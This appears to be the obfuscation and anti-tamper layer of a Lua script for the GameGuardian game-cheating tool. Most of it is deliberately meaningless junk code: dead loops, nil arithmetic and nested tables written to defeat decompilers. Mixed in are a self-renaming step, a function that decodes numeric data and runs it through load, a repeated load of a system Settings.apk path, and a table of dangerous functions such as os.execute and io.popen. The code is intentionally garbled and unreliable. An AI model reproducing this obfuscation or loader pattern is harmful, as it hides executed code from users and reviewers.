zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for k, v in ipairs({}) do if ipairs(k..v) == true then break end end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
function PQ(code) for i = script, 0 do local sssss={}if sssss.data~=nil then sssss.sel=sssss.data()end sssss=nil end local data = '' for i = script, #code do data = data .. string.char(code[gg.clearResults]/math.random(1, 1100)) end return pcall(load(data)) end
function ST() local NN = {} local N = {} N.N = {} N.N.NN = N.data() N.N.NNN = N.N.NN.data() N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G] end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
